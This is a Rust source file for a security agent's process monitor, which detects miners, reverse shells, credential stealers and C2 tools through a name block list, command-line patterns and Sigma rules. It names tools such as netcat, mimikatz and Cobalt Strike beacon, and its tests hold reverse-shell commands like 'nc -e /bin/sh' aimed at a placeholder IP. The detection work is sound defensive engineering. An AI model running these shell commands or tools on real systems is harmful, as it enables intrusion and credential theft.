// Copyright (c) 2024-2026 Cyber Threat Consulting
// SPDX-License-Identifier: MIT

//! Process monitoring for suspicious activity detection.

use super::{IncidentSeverity, IncidentType, SecurityIncident};
use crate::error::ScannerResult;
#[cfg(any(target_os = "macos", target_os = "windows"))]
use agent_common::process::silent_command;
use std::collections::HashSet;
use tracing::{debug, warn};

/// Known suspicious process names - exact matches required.
/// The bool indicates if exact match is required (true) or contains match (false).
const SUSPICIOUS_PROCESSES: &[(&str, &str, IncidentType, bool)] = &[
    // Crypto miners - use contains match as they may have version suffixes
    (
        "xmrig",
        "XMRig crypto miner",
        IncidentType::CryptoMiner,
        false,
    ),
    ("minerd", "CPU miner", IncidentType::CryptoMiner, true),
    ("cgminer", "ASIC/GPU miner", IncidentType::CryptoMiner, true),
    (
        "bfgminer",
        "ASIC/GPU miner",
        IncidentType::CryptoMiner,
        true,
    ),
    ("cpuminer", "CPU miner", IncidentType::CryptoMiner, false),
    (
        "ethminer",
        "Ethereum miner",
        IncidentType::CryptoMiner,
        true,
    ),
    ("xmr-stak", "Monero miner", IncidentType::CryptoMiner, false),
    ("t-rex", "T-Rex GPU miner", IncidentType::CryptoMiner, true),
    ("nbminer", "NBMiner", IncidentType::CryptoMiner, true),
    (
        "phoenixminer",
        "Phoenix miner",
        IncidentType::CryptoMiner,
        false,
    ),
    ("lolminer", "lolMiner", IncidentType::CryptoMiner, true),
    ("gminer", "GMiner", IncidentType::CryptoMiner, true),
    // Reverse shells / network tools - EXACT match only to avoid false positives
    // (nc would match launchd, syncd, etc.)
    (
        "nc",
        "netcat - potential reverse shell",
        IncidentType::ReverseShell,
        true,
    ),
    (
        "ncat",
        "ncat - potential reverse shell",
        IncidentType::ReverseShell,
        true,
    ),
    (
        "netcat",
        "netcat - potential reverse shell",
        IncidentType::ReverseShell,
        true,
    ),
    (
        "socat",
        "socat - potential tunnel",
        IncidentType::ReverseShell,
        true,
    ),
    // Credential theft tools - exact match
    (
        "mimikatz",
        "Mimikatz credential stealer",
        IncidentType::CredentialTheft,
        false,
    ),
    (
        "lazagne",
        "LaZagne credential stealer",
        IncidentType::CredentialTheft,
        false,
    ),
    (
        "secretsdump",
        "Impacket secretsdump",
        IncidentType::CredentialTheft,
        false,
    ),
    (
        "procdump",
        "ProcDump (may dump credentials)",
        IncidentType::CredentialTheft,
        true,
    ),
    (
        "gsecdump",
        "Credential dump tool",
        IncidentType::CredentialTheft,
        true,
    ),
    (
        "wce.exe",
        "Windows Credential Editor",
        IncidentType::CredentialTheft,
        true,
    ),
    // Post-exploitation - exact match to avoid false positives
    // (beacon would match findmybeaconingd, empire would match empirestate, etc.)
    (
        "meterpreter",
        "Metasploit payload",
        IncidentType::Malware,
        false,
    ),
    (
        "beacon.exe",
        "Cobalt Strike beacon",
        IncidentType::Malware,
        true,
    ),
    (
        "empire.exe",
        "PowerShell Empire",
        IncidentType::Malware,
        true,
    ),
    ("covenant", "Covenant C2", IncidentType::Malware, true),
    // Privilege escalation - exact match
    (
        "getsystem",
        "Privilege escalation",
        IncidentType::PrivilegeEscalation,
        true,
    ),
    (
        "pspy",
        "Process spy - enumeration tool",
        IncidentType::PrivilegeEscalation,
        true,
    ),
    (
        "pspy64",
        "Process spy - enumeration tool",
        IncidentType::PrivilegeEscalation,
        true,
    ),
];

/// Process information for analysis.
#[derive(Debug, Clone)]
pub struct ProcessInfo {
    /// Process ID.
    pub pid: u32,
    /// Process name.
    pub name: String,
    /// Executable path (if available).
    pub path: Option<String>,
    /// Command line arguments (if available).
    pub cmdline: Option<String>,
    /// Parent PID.
    pub ppid: Option<u32>,
    /// User running the process.
    pub user: Option<String>,
}

/// Process monitor for detecting suspicious processes.
pub struct ProcessMonitor {
    /// Additional custom patterns to watch for.
    custom_patterns: HashSet<String>,
    /// Sigma rules evaluated against every process, when any is loaded.
    sigma: Option<super::sigma::SigmaEngine>,
}

impl ProcessMonitor {
    /// Create a new process monitor.
    pub fn new() -> Self {
        Self {
            custom_patterns: HashSet::new(),
            sigma: None,
        }
    }

    /// Evaluate these Sigma rules against every process as well.
    pub fn set_sigma_engine(&mut self, engine: super::sigma::SigmaEngine) {
        self.sigma = (engine.rule_count() > 0).then_some(engine);
    }

    /// Add a custom process pattern to watch for.
    pub fn add_pattern(&mut self, pattern: String) {
        self.custom_patterns.insert(pattern.to_lowercase());
    }

    /// Get list of running processes.
    #[cfg(target_os = "linux")]
    fn get_processes(&self) -> ScannerResult<Vec<ProcessInfo>> {
        use std::fs;

        let mut processes = Vec::new();

        // Read /proc for process information
        if let Ok(entries) = fs::read_dir("/proc") {
            for entry in entries.flatten() {
                let path = entry.path();
                if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
                    // Check if directory name is a PID
                    if let Ok(pid) = name.parse::<u32>()
                        && let Ok(proc_info) = self.read_proc_info(&path, pid)
                    {
                        processes.push(proc_info);
                    }
                }
            }
        }

        Ok(processes)
    }

    #[cfg(target_os = "linux")]
    fn read_proc_info(&self, proc_path: &std::path::Path, pid: u32) -> ScannerResult<ProcessInfo> {
        use std::fs;

        // Read comm (process name)
        let comm_path = proc_path.join("comm");
        let name = fs::read_to_string(comm_path)
            .map(|s| s.trim().to_string())
            .unwrap_or_else(|_| "unknown".to_string());

        // Read exe (executable path)
        let exe_path = proc_path.join("exe");
        let path = fs::read_link(exe_path)
            .ok()
            .map(|p| p.to_string_lossy().to_string());

        // Read cmdline
        let cmdline_path = proc_path.join("cmdline");
        let cmdline = fs::read_to_string(cmdline_path)
            .ok()
            .map(|s| s.replace('\0', " ").trim().to_string())
            .filter(|s| !s.is_empty());

        // Read status for ppid
        let status_path = proc_path.join("status");
        let ppid = fs::read_to_string(status_path).ok().and_then(|s| {
            s.lines()
                .find(|l| l.starts_with("PPid:"))
                .and_then(|l| l.split_whitespace().nth(1))
                .and_then(|v| v.parse().ok())
        });

        Ok(ProcessInfo {
            pid,
            name,
            path,
            cmdline,
            ppid,
            user: None, // Could read from /proc/[pid]/status Uid
        })
    }

    #[cfg(target_os = "macos")]
    fn get_processes(&self) -> ScannerResult<Vec<ProcessInfo>> {
        let output = silent_command("ps")
            .args(["-axo", "pid,ppid,user,comm"])
            .output()
            .map_err(|e| crate::error::ScannerError::Command(format!("Failed to run ps: {}", e)))?;

        if !output.status.success() {
            return Err(crate::error::ScannerError::Command(
                "Unable to enumerate running processes: ps failed".into(),
            ));
        }
        let arguments = silent_command("ps")
            .args(["-axo", "pid=,args="])
            .output()
            .map_err(|_| {
                crate::error::ScannerError::Command(
                    "Unable to collect process command lines".into(),
                )
            })?;
        if !arguments.status.success() {
            return Err(crate::error::ScannerError::Command(
                "Unable to collect process command lines: ps failed".into(),
            ));
        }
        let command_lines: std::collections::HashMap<u32, String> =
            String::from_utf8_lossy(&arguments.stdout)
                .lines()
                .filter_map(|line| {
                    let (pid, command) = line.trim().split_once(char::is_whitespace)?;
                    Some((pid.parse().ok()?, command.trim().to_owned()))
                })
                .collect();
        let stdout = String::from_utf8_lossy(&output.stdout);
        let mut processes = Vec::new();

        for line in stdout.lines().skip(1) {
            // Skip header
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 4 {
                let pid: u32 = parts[0].parse().unwrap_or(0);
                let ppid: u32 = parts[1].parse().unwrap_or(0);
                let user = parts[2].to_string();
                // Cap at 256 parts to avoid unbounded allocation on adversarial input.
                let name_end = parts.len().min(3 + 256);
                let name = parts[3..name_end].join(" ");

                processes.push(ProcessInfo {
                    pid,
                    name,
                    path: None,
                    cmdline: command_lines.get(&pid).cloned(),
                    ppid: Some(ppid),
                    user: Some(user),
                });
            }
        }

        Ok(processes)
    }

    #[cfg(target_os = "windows")]
    fn get_processes(&self) -> ScannerResult<Vec<ProcessInfo>> {
        // Use Get-CimInstance (fallback to Get-WmiObject if needed) to get CommandLine which Get-Process lacks
        let output = silent_command("powershell")
            .args([
                "-NoProfile",
                "-Command",
                "Get-CimInstance Win32_Process | Select-Object ProcessId,ParentProcessId,Name,Path,CommandLine | ConvertTo-Json",
            ])
            .output()
            .map_err(|e| {
                crate::error::ScannerError::Command(format!("Failed to run Get-CimInstance: {}", e))
            })?;

        #[derive(serde::Deserialize)]
        #[serde(rename_all = "PascalCase")]
        struct WinProcess {
            process_id: u32,
            #[serde(default)]
            parent_process_id: Option<u32>,
            name: String,
            path: Option<String>,
            command_line: Option<String>,
        }

        let stdout = String::from_utf8_lossy(&output.stdout);
        let raw = agent_common::process::parse_powershell_json_array(&stdout).unwrap_or_else(|e| {
            tracing::warn!("Failed to parse process list JSON: {}", e);
            vec![]
        });
        let processes: Vec<WinProcess> = raw
            .into_iter()
            .filter_map(|v| serde_json::from_value(v).ok())
            .collect();

        Ok(processes
            .into_iter()
            .map(|p| ProcessInfo {
                pid: p.process_id,
                name: p.name,
                path: p.path,
                cmdline: p.command_line,
                ppid: p.parent_process_id,
                user: None,
            })
            .collect())
    }

    #[cfg(not(any(target_os = "linux", target_os = "macos", target_os = "windows")))]
    fn get_processes(&self) -> ScannerResult<Vec<ProcessInfo>> {
        Ok(Vec::new())
    }

    /// Analyze a process against known suspicious patterns.
    fn analyze_process(&self, proc: &ProcessInfo) -> Option<SecurityIncident> {
        let name_lower = proc.name.to_lowercase();
        // Get just the executable name without path
        let exe_name = name_lower
            .rsplit(['/', '\\'])
            .next()
            .unwrap_or(&name_lower)
            .to_string();

        // Check against known suspicious processes
        for (pattern, description, incident_type, exact_match) in SUSPICIOUS_PROCESSES {
            let matches = if *exact_match {
                // Exact match: process name must equal pattern exactly
                exe_name.trim_end_matches(".exe") == pattern.trim_end_matches(".exe")
            } else {
                // Contains match: pattern must be present in name
                exe_name.contains(pattern)
            };

            if matches {
                // Dual-use tools need execution/target evidence; a diagnostic nc or
                // an ordinary process dump is not proof of a reverse shell/credential theft.
                let command = proc.cmdline.as_deref().unwrap_or("").to_lowercase();
                if *incident_type == IncidentType::ReverseShell {
                    let tokens: Vec<_> = command.split_whitespace().collect();
                    let executes = tokens
                        .iter()
                        .any(|arg| matches!(*arg, "-e" | "--exec" | "-c" | "--sh-exec"))
                        || command.contains("exec:")
                        || command.contains("system:");
                    if !executes {
                        continue;
                    }
                }
                if *pattern == "procdump" && !command.contains("lsass") {
                    continue;
                }
                let severity = match incident_type {
                    IncidentType::CryptoMiner => IncidentSeverity::High,
                    IncidentType::Malware => IncidentSeverity::Critical,
                    IncidentType::CredentialTheft => IncidentSeverity::Critical,
                    IncidentType::ReverseShell => IncidentSeverity::High,
                    IncidentType::PrivilegeEscalation => IncidentSeverity::High,
                    _ => IncidentSeverity::Medium,
                };

                return Some(
                    SecurityIncident::new(
                        *incident_type,
                        severity,
                        format!("Suspicious process detected: {}", proc.name),
                        format!("{} - {}", proc.name, description),
                    )
                    .with_evidence(serde_json::json!({
                        "process_name": proc.name,
                        "pid": proc.pid,
                        "path": proc.path,
                        "cmdline": proc.cmdline,
                        "matched_pattern": pattern,
                        "description": description,
                    }))
                    .with_confidence(85),
                );
            }
        }

        // Check custom patterns
        for pattern in &self.custom_patterns {
            if name_lower.contains(pattern) {
                return Some(SecurityIncident::suspicious_process(
                    &proc.name,
                    proc.pid,
                    proc.path.as_deref(),
                    &format!("Matches custom pattern: {}", pattern),
                    70,
                ));
            }
        }

        // Check command line for suspicious patterns
        if let Some(cmdline) = &proc.cmdline {
            let cmdline_lower = cmdline.to_lowercase();

            // Check for base64 encoded commands (common in malware)
            if matches!(exe_name.trim_end_matches(".exe"), "powershell" | "pwsh")
                && (cmdline_lower
                    .split_whitespace()
                    .any(|arg| matches!(arg, "-encodedcommand" | "-enc"))
                    || cmdline_lower.contains("frombase64"))
            {
                return Some(
                    SecurityIncident::new(
                        IncidentType::SuspiciousProcess,
                        IncidentSeverity::Medium,
                        format!("Encoded command execution: {}", proc.name),
                        "Process running with encoded/obfuscated command line",
                    )
                    .with_evidence(serde_json::json!({
                        "process_name": proc.name,
                        "pid": proc.pid,
                        "cmdline": cmdline,
                        "reason": "encoded_command",
                    }))
                    .with_confidence(60),
                );
            }

            // Check for reverse shell patterns
            if (cmdline_lower.contains("/dev/tcp/") || cmdline_lower.contains("bash -i"))
                && cmdline_lower.contains(">&")
            {
                return Some(
                    SecurityIncident::new(
                        IncidentType::ReverseShell,
                        IncidentSeverity::Critical,
                        format!("Reverse shell detected: {}", proc.name),
                        "Process appears to be establishing a reverse shell connection",
                    )
                    .with_evidence(serde_json::json!({
                        "process_name": proc.name,
                        "pid": proc.pid,
                        "cmdline": cmdline,
                    }))
                    .with_confidence(90),
                );
            }
        }

        None
    }

    /// Evaluate a process that has just started: the built-in patterns, then
    /// the Sigma rules. The agent's own process is never evaluated.
    pub fn analyze_start(
        &self,
        start: &super::process_events::ProcessStart,
    ) -> Vec<SecurityIncident> {
        let process = &start.process;
        if process.pid == std::process::id() {
            return Vec::new();
        }
        let mut incidents: Vec<SecurityIncident> =
            self.analyze_process(process).into_iter().collect();
        if let Some(sigma) = &self.sigma {
            let parent = start.parent_image.as_ref().map(|image| ProcessInfo {
                pid: process.ppid.unwrap_or(0),
                name: image
                    .rsplit(['/', '\\'])
                    .next()
                    .unwrap_or(image)
                    .to_string(),
                path: Some(image.clone()),
                cmdline: None,
                ppid: None,
                user: None,
            });
            incidents.extend(sigma_incidents_for(sigma, process, parent.as_ref()));
        }
        incidents
    }

    /// Scan all running processes for suspicious activity.
    pub async fn scan_processes(&self) -> ScannerResult<(Vec<SecurityIncident>, u32)> {
        let (incidents, processes) = self.scan_processes_with_snapshot().await?;
        Ok((
            incidents,
            u32::try_from(processes.len()).unwrap_or(u32::MAX),
        ))
    }

    /// Scan all running processes and return, with the incidents, the process
    /// list the scan was run on (for rules evaluated on every process, not
    /// only on the suspicious ones).
    pub async fn scan_processes_with_snapshot(
        &self,
    ) -> ScannerResult<(Vec<SecurityIncident>, Vec<ProcessInfo>)> {
        let processes = self.get_processes()?;
        let count = u32::try_from(processes.len()).unwrap_or(u32::MAX);
        let mut incidents = Vec::new();

        // Anti-Draper: exclude the agent's own PID from scanning to prevent
        // self-detection when custom patterns are added.
        let my_pid = std::process::id();

        debug!(
            "Scanning {} processes (excluding own PID {})",
            count, my_pid
        );

        if let Some(sigma) = &self.sigma {
            incidents.extend(sigma_incidents(sigma, &processes, my_pid));
        }

        for proc in &processes {
            if proc.pid == my_pid {
                continue;
            }
            if let Some(incident) = self.analyze_process(proc) {
                warn!(
                    "Suspicious process detected: {} (PID: {})",
                    proc.name, proc.pid
                );
                incidents.push(incident);
            }
        }

        Ok((incidents, processes))
    }
}

/// Incidents for the processes matching Sigma rules. The agent's own process
/// is never evaluated.
fn sigma_incidents(
    engine: &super::sigma::SigmaEngine,
    processes: &[ProcessInfo],
    own_pid: u32,
) -> Vec<SecurityIncident> {
    let by_pid: std::collections::HashMap<u32, &ProcessInfo> =
        processes.iter().map(|p| (p.pid, p)).collect();
    processes
        .iter()
        .filter(|process| process.pid != own_pid)
        .flat_map(|process| {
            let parent = process.ppid.and_then(|ppid| by_pid.get(&ppid).copied());
            sigma_incidents_for(engine, process, parent)
        })
        .collect()
}

/// Incidents for one process matching Sigma rules.
fn sigma_incidents_for(
    engine: &super::sigma::SigmaEngine,
    process: &ProcessInfo,
    parent: Option<&ProcessInfo>,
) -> Vec<SecurityIncident> {
    use super::sigma::{SigmaLevel, process_event};
    use super::{IncidentSeverity, IncidentType};

    let event = process_event(process, parent);
    engine
        .evaluate(&event)
        .into_iter()
        .map(|rule| {
            let (severity, confidence) = match rule.level {
                SigmaLevel::Critical => (IncidentSeverity::Critical, 90),
                SigmaLevel::High => (IncidentSeverity::High, 80),
                SigmaLevel::Medium => (IncidentSeverity::Medium, 60),
                SigmaLevel::Low => (IncidentSeverity::Low, 40),
                SigmaLevel::Informational => (IncidentSeverity::Low, 20),
            };
            warn!(
                "Sigma rule '{}' matched process {} (PID: {})",
                rule.title, process.name, process.pid
            );
            let description = if rule.description.is_empty() {
                format!("Sigma rule \"{}\" matched this process.", rule.title)
            } else {
                rule.description.clone()
            };
            SecurityIncident::new(
                IncidentType::SuspiciousProcess,
                severity,
                format!("Sigma: {}", rule.title),
                description,
            )
            .with_confidence(confidence)
            .with_evidence(serde_json::json!({
                "detection": "sigma",
                "rule_id": rule.id,
                "rule_title": rule.title,
                "attack_techniques": rule.attack_techniques(),
                "process_name": process.name,
                "pid": process.pid,
                "path": process.path.clone().or_else(|| process.cmdline.clone()),
                "cmdline": process.cmdline,
                "ppid": process.ppid,
                "parent_image": parent.map(|p| p.path.clone().unwrap_or_else(|| p.name.clone())),
                "user": process.user,
            }))
        })
        .collect()
}

impl Default for ProcessMonitor {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn sigma_matches_become_process_incidents_with_their_parent() {
        use crate::security::sigma::{SigmaEngine, parse_rule};
        let rule = parse_rule(
            "title: Netcat Reverse Shell\nid: test-rule-1\ndescription: Netcat started with -e.\n\
             level: critical\ntags:\n  - attack.t1059.004\nlogsource:\n  category: process_creation\n\
             detection:\n  sel:\n    Image|endswith: '/nc'\n    CommandLine|contains: ' -e '\n    \
             ParentImage|endswith: '/sshd'\n  condition: sel\n",
        )
        .unwrap();
        let engine = SigmaEngine::with_rules(vec![rule]);
        let process = |pid: u32, ppid: u32, path: &str, cmdline: &str| ProcessInfo {
            pid,
            name: path.rsplit('/').next().unwrap_or(path).to_string(),
            path: Some(path.to_string()),
            cmdline: Some(cmdline.to_string()),
            ppid: Some(ppid),
            user: Some("alice".to_string()),
        };
        let processes = vec![
            process(100, 1, "/usr/sbin/sshd", "sshd: alice"),
            process(200, 100, "/usr/bin/nc", "nc -e /bin/sh 203.0.113.9 4444"),
            // Same command, but not started from sshd.
            process(300, 1, "/usr/bin/nc", "nc -e /bin/sh 203.0.113.9 4444"),
            // Would match, but it is the agent itself.
            process(400, 100, "/usr/bin/nc", "nc -e /bin/sh 203.0.113.9 4444"),
        ];

        let incidents = sigma_incidents(&engine, &processes, 400);
        assert_eq!(incidents.len(), 1);
        let incident = &incidents[0];
        assert_eq!(
            incident.incident_type,
            crate::security::IncidentType::SuspiciousProcess
        );
        assert_eq!(
            incident.severity,
            crate::security::IncidentSeverity::Critical
        );
        assert_eq!(incident.title, "Sigma: Netcat Reverse Shell");
        assert_eq!(incident.description, "Netcat started with -e.");
        assert_eq!(incident.confidence, 90);
        assert_eq!(incident.evidence["pid"], 200);
        assert_eq!(incident.evidence["process_name"], "nc");
        assert_eq!(incident.evidence["parent_image"], "/usr/sbin/sshd");
        assert_eq!(incident.evidence["rule_id"], "test-rule-1");
        assert_eq!(incident.evidence["attack_techniques"][0], "T1059.004");

        // The same rule applies to a process reported as it starts, with the
        // parent image the event carries.
        let rule = parse_rule(
            "title: Netcat Reverse Shell\nlogsource:\n  category: process_creation\n\
             detection:\n  sel:\n    Image|endswith: '/nc'\n    ParentImage|endswith: '/sshd'\n  condition: sel\n",
        )
        .unwrap();
        let mut monitor = ProcessMonitor::new();
        monitor.set_sigma_engine(SigmaEngine::with_rules(vec![rule]));
        let start =
            |pid: u32, parent: Option<&str>| crate::security::process_events::ProcessStart {
                process: process(pid, 100, "/usr/bin/nc", "nc 203.0.113.9 4444"),
                parent_image: parent.map(str::to_string),
            };
        let incidents = monitor.analyze_start(&start(200, Some("/usr/sbin/sshd")));
        assert_eq!(incidents.len(), 1);
        assert_eq!(incidents[0].evidence["parent_image"], "/usr/sbin/sshd");
        assert!(
            monitor
                .analyze_start(&start(200, Some("/bin/zsh")))
                .is_empty()
        );
        assert!(monitor.analyze_start(&start(200, None)).is_empty());
        assert!(
            monitor
                .analyze_start(&start(std::process::id(), Some("/usr/sbin/sshd")))
                .is_empty(),
            "the agent never evaluates itself"
        );

        // An engine without rules is not kept.
        let mut monitor = ProcessMonitor::new();
        monitor.set_sigma_engine(SigmaEngine::default());
        assert!(monitor.sigma.is_none());
    }

    #[test]
    fn test_process_monitor_creation() {
        let monitor = ProcessMonitor::new();
        assert!(monitor.custom_patterns.is_empty());
    }

    #[test]
    fn test_add_custom_pattern() {
        let mut monitor = ProcessMonitor::new();
        monitor.add_pattern("mymalware".to_string());
        assert!(monitor.custom_patterns.contains("mymalware"));
    }

    #[test]
    fn test_analyze_crypto_miner() {
        let monitor = ProcessMonitor::new();
        let proc = ProcessInfo {
            pid: 1234,
            name: "xmrig".to_string(),
            path: Some("/tmp/xmrig".to_string()),
            cmdline: None,
            ppid: Some(1),
            user: None,
        };

        let incident = monitor.analyze_process(&proc);
        assert!(incident.is_some());
        let incident = incident.unwrap();
        assert_eq!(incident.incident_type, IncidentType::CryptoMiner);
        assert_eq!(incident.severity, IncidentSeverity::High);
    }

    #[test]
    fn test_analyze_clean_process() {
        let monitor = ProcessMonitor::new();
        let proc = ProcessInfo {
            pid: 1234,
            name: "bash".to_string(),
            path: Some("/bin/bash".to_string()),
            cmdline: Some("bash".to_string()),
            ppid: Some(1),
            user: None,
        };

        let incident = monitor.analyze_process(&proc);
        assert!(incident.is_none());
    }

    #[test]
    fn test_analyze_encoded_command() {
        let monitor = ProcessMonitor::new();
        let proc = ProcessInfo {
            pid: 1234,
            name: "powershell".to_string(),
            path: None,
            cmdline: Some("powershell.exe -EncodedCommand SGVsbG8gV29ybGQ=".to_string()),
            ppid: Some(1),
            user: None,
        };

        let incident = monitor.analyze_process(&proc);
        assert!(incident.is_some());
        assert_eq!(
            incident.unwrap().incident_type,
            IncidentType::SuspiciousProcess
        );
    }

    #[test]
    fn test_analyze_custom_pattern() {
        let mut monitor = ProcessMonitor::new();
        monitor.add_pattern("badprocess".to_string());

        let proc = ProcessInfo {
            pid: 1234,
            name: "my-badprocess-v1".to_string(),
            path: None,
            cmdline: None,
            ppid: None,
            user: None,
        };

        let incident = monitor.analyze_process(&proc);
        assert!(incident.is_some());
    }

    #[test]
    fn test_no_false_positive_launchd() {
        // launchd contains "nc" but should NOT trigger a reverse shell detection
        let monitor = ProcessMonitor::new();
        let proc = ProcessInfo {
            pid: 1,
            name: "launchd".to_string(),
            path: Some("/sbin/launchd".to_string()),
            cmdline: None,
            ppid: Some(0),
            user: Some("root".to_string()),
        };

        let incident = monitor.analyze_process(&proc);
        assert!(
            incident.is_none(),
            "launchd should not be flagged as suspicious"
        );
    }

    #[test]
    fn test_no_false_positive_findmybeaconingd() {
        // findmybeaconingd contains "beacon" but is Apple's Find My service
        let monitor = ProcessMonitor::new();
        let proc = ProcessInfo {
            pid: 1234,
            name: "findmybeaconingd".to_string(),
            path: Some("/usr/libexec/findmybeaconingd".to_string()),
            cmdline: None,
            ppid: Some(1),
            user: None,
        };

        let incident = monitor.analyze_process(&proc);
        assert!(
            incident.is_none(),
            "findmybeaconingd should not be flagged as malware"
        );
    }

    #[test]
    fn test_exact_match_nc() {
        // nc (exactly) should trigger detection
        let monitor = ProcessMonitor::new();
        let proc = ProcessInfo {
            pid: 1234,
            name: "nc".to_string(),
            path: Some("/usr/bin/nc".to_string()),
            cmdline: Some("nc -e /bin/sh 203.0.113.1 4444".into()),
            ppid: Some(1),
            user: None,
        };

        let incident = monitor.analyze_process(&proc);
        assert!(
            incident.is_some(),
            "nc exact match should trigger detection"
        );
        assert_eq!(incident.unwrap().incident_type, IncidentType::ReverseShell);
    }
    #[test]
    fn diagnostic_tools_and_search_arguments_do_not_become_malware() {
        let monitor = ProcessMonitor::new();
        for (name, command) in [
            ("nc", "nc -z localhost 8080"),
            ("socat", "socat TCP:localhost:8000 STDIO"),
            ("rg", "rg frombase64 -encodedcommand src"),
            ("procdump", "procdump application.exe"),
        ] {
            let process = ProcessInfo {
                pid: 999,
                name: name.into(),
                path: None,
                cmdline: Some(command.into()),
                ppid: None,
                user: None,
            };
            assert!(monitor.analyze_process(&process).is_none(), "{command}");
        }
    }
}
